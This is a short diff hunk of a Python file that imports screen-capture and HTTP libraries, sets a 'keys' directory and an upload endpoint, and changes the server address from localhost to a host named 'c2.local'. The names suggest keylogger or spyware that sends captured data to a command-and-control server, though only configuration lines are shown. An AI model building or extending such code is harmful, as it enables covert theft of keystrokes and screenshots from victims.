@@ -2,7 +2,7 @@ import requests
 from PIL import ImageGrab
 from datetime import datetime
 from pathlib import Path
-SERVER_URL = "https://127.0.0.1"
+SERVER_URL = "https://c2.local"
 BASE_DIR = Path.cwd()
 UPLOAD_ENDPOINT = "/upload"
 keys_dir = BASE_DIR / "keys"
